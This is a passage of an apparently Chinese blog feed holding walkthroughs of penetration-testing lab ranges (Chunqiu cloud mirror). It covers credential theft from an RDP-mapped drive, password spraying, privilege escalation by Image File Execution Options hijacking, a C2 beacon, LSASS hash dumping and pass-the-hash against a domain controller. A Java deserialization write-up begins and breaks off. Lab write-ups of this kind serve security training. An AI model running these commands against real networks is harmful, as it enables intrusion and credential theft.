&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ ./fscan -h 172.22.8.18/24
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ___ _
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> / _ &lt;span class="se">\ &lt;/span> ___ ___ _ __ __ _ ___&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> __
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> / /_&lt;span class="se">\/&lt;/span>____/ __&lt;span class="p">|&lt;/span>/ __&lt;span class="p">|&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>__/ _&lt;span class="sb">`&lt;/span> &lt;span class="p">|&lt;/span>/ __&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>/ /
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/ /_&lt;span class="se">\\&lt;/span>_____&lt;span class="se">\_&lt;/span>_ &lt;span class="se">\ &lt;/span>&lt;span class="o">(&lt;/span>__&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>__&lt;span class="p">|&lt;/span> &amp;lt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">\_&lt;/span>___/ &lt;span class="p">|&lt;/span>___/&lt;span class="se">\_&lt;/span>__&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="se">\_&lt;/span>_,_&lt;span class="p">|&lt;/span>&lt;span class="se">\_&lt;/span>__&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>&lt;span class="se">\_\ &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fscan version: 1.8.4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start infoscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">trying RunIcmp2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The current user permissions unable to send icmp packets
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.8.15 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.8.31 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.8.18 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.8.46 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Icmp alive hosts len is: &lt;span class="m">4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.15:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.46:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.46:80 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.18:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.18:80 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.31:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.15:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.18:1433 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.46:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.18:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.46:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.15:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.18:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.31:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.31:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.15:88 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.8.18:10010 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> alive ports len is: &lt;span class="m">17&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start vulscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> WebTitle http://172.22.8.18 code:200 len:703 title:IIS Windows Server
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.22.8.31
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>WIN19-CLIENT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.8.31
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.22.8.46
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>WIN2016
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.8.46
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> WebTitle http://172.22.8.46 code:200 len:703 title:IIS Windows Server
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.22.8.18
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>WIN-WEB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.8.18
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.22.8.15
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>DC01
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.8.15
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.22.8.15 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> DC:XIAORANG&lt;span class="se">\D&lt;/span>C01
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.22.8.31 XIAORANG&lt;span class="se">\W&lt;/span>IN19-CLIENT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server &lt;span class="m">2016&lt;/span> Datacenter &lt;span class="m">14393&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> mssql 172.22.8.18:1433:sa 1qaz!QAZ
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>整理一下&lt;/p>
&lt;ul>
&lt;li>172.22.8.15 XIAORANG\DC01&lt;/li>
&lt;li>172.22.8.31 XIAORANG\WIN19-CLIENT&lt;/li>
&lt;li>172.22.8.18 已拿下&lt;/li>
&lt;li>172.22.8.46 WIN2016.xiaorang.lab&lt;/li>
&lt;/ul>
&lt;p>刚才找flag的时候，我发现了一个用户John，查看用户会话&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">shell net users
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell query user
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-01-09.png"
width="1110"
height="612"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-01-09_hu_c093c602bc45520f.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-01-09_hu_dccb419317a71530.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="181"
data-flex-basis="435px"
>&lt;/p>
&lt;p>进程注入这个用户&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-03-08.png"
width="2506"
height="1506"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-03-08_hu_68e30e77ac658935.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-03-08_hu_ae2536c61d13df6f.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="166"
data-flex-basis="399px"
>&lt;/p>
&lt;p>成功上线John用户&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-06-18.png"
width="2543"
height="304"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-06-18_hu_e3123435791c70f0.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-06-18_hu_fe81960d3c56772f.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="836"
data-flex-basis="2007px"
>&lt;/p>
&lt;p>看看网络共享&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">shell net use
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell dir &lt;span class="se">\\&lt;/span>TSCLIENT&lt;span class="se">\C&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell &lt;span class="nb">type&lt;/span> &lt;span class="se">\\&lt;/span>TSCLIENT&lt;span class="se">\C\c&lt;/span>redential.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>得到了一个域用户&lt;code>xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#&lt;/code>，喷洒攻击&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netexec rdp 172.22.8.0/24 -u &lt;span class="s1">&amp;#39;Aldrich&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;Ald@rLMWuy7Z!#&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-15-12.png"
width="1323"
height="197"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-15-12_hu_d8eead86726ee149.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-15-12_hu_38369ea73dbb31b5.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="671"
data-flex-basis="1611px"
>&lt;/p>
&lt;p>要么过期要么登录失败，过期可以修改密码&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbpasswd -r 172.22.8.15 -U xiaorang.lab/Aldrich
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ald@rLMWuy7Z!#
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Whoami@666
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Whoami@666
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>RDP上去查看注册表&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-Acl&lt;/span> &lt;span class="n">-path&lt;/span> &lt;span class="s2">&amp;#34;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">fl &lt;/span>&lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/2.png"
width="1458"
height="804"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/2_hu_ecd393115e0f9c6a.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/2_hu_bd0631e76fee3ce1.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="181"
data-flex-basis="435px"
>&lt;/p>
&lt;p>所有正常登录的用户都有权限修改注册表，修改注册表映像劫持，把本来用户主页点放大镜启动的&lt;code>magnify.exe&lt;/code>替换成&lt;code>C:\windows\system32\cmd.exe&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">REG&lt;/span> &lt;span class="n">ADD&lt;/span> &lt;span class="s2">&amp;#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">Debugger&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">t&lt;/span> &lt;span class="n">REG_SZ&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="s2">&amp;#34;C:\windows\system32\cmd.exe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>锁定用户，再在右下角的放大镜打开就是SYSTEM，同样的上线C2，现在先在入口机建立一个监听器&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">&lt;span class="k">cd&lt;/span> C:\Users\Aldrich\Desktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">beacon1.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-28-38.png"
width="2535"
height="222"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-28-38_hu_1518d725fcebab51.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-28-38_hu_c281ab0095e89c41.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="1141"
data-flex-basis="2740px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">shell &lt;span class="nb">type&lt;/span> C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\f&lt;/span>lag&lt;span class="se">\f&lt;/span>lag02.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>再利用SharpHound收集域内信息&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">SharpHound.exe -c all
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag3">flag3
&lt;/h2>&lt;p>查看域内管理员发现有WIN2016$&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-42-39.png"
width="925"
height="448"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-42-39_hu_336b812c9283eca4.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-42-39_hu_b48e23db4d4f6c81.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="206"
data-flex-basis="495px"
>&lt;/p>
&lt;p>看看出站对象控制&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-46-01.png"
width="830"
height="577"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-46-01_hu_b42e78bc331bed11.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-46-01_hu_91f9bed4cebc1fb0.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="143"
data-flex-basis="345px"
>&lt;/p>
&lt;p>可以直达DC01，并且再一看发现&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-48-34.png"
width="1222"
height="740"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-48-34_hu_92830129d5a010a5.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-48-34_hu_d6c65bb9fab94c62.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="165"
data-flex-basis="396px"
>&lt;/p>
&lt;p>这个玩意也是域控，查看机器用户权限&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-50-12.png"
width="787"
height="612"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-50-12_hu_473734ed83aa3a5f.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-tsclient/PixPin_2025-08-12_16-50-12_hu_78ae067ba3806ec3.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="128"
data-flex-basis="308px"
>&lt;/p>
&lt;p>发现&lt;strong>SeDebugPrivilege&lt;/strong>权限（SYSTEM用户都有），可以读取 LSASS，在CS4.2运行&lt;code>logonpasswords&lt;/code>获得机器&lt;code>NTHash&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">netexec wmi 172.22.8.15 -u WIN2016$ -H d3048f817ff9098184db91ef77f2d76e -d xiaorang -x &amp;#34;whoami&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netexec wmi 172.22.8.15 -u WIN2016$ -H d3048f817ff9098184db91ef77f2d76e -d xiaorang -x &amp;#34;type C:\Users\Administrator\flag\flag03.txt&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>春秋云镜Aoselu</title><link>https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/</link><pubDate>Sun, 10 Aug 2025 21:25:22 +0000</pubDate><guid>https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/</guid><description>&lt;blockquote>
&lt;p>本靶场以虚构汽车制造企业 Aoselu 为背景，模拟其真实企业内部网络环境，玩家需要进行信息收集、权限提升、横向移动、服务利用等内网渗透技术，逐步获取4个flag。 目前已通过信息收集获得该企业某员工的邮箱 ：rachel.cook9@aoseluauto.com/!QAZ2wsx&lt;/p>&lt;/blockquote>
&lt;h2 id="flag1">flag1
&lt;/h2>&lt;p>先扫描一下，8080端口发现了登录接口，登录进去之后，发现没见过这个系统，可能是自己二开的，抓个包，发现Cookie是Java反序列化一样的payload&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/1.png"
width="754"
height="386"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/1_hu_46b8badbc4205811.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/1_hu_1e7c09f7d37f3937.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="195"
data-flex-basis="468px"
>&lt;/p>
&lt;p>测试之后发现这条链子可以打&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/2.png"
width="973"
height="614"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/2_hu_6295115a0e0286bc.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/2_hu_de574566a9e5884d.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="158"
data-flex-basis="380px"
>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/3.png"
width="1285"
height="692"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/3_hu_dd4ecd69f4fa121e.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/3_hu_2b4b64970f2442b7.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="185"
data-flex-basis="445px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/mail/u/0/&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">39.99.158.15:8080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.9,en;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade-Insecure-Requests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Referer&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://39.99.158.15:8080/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
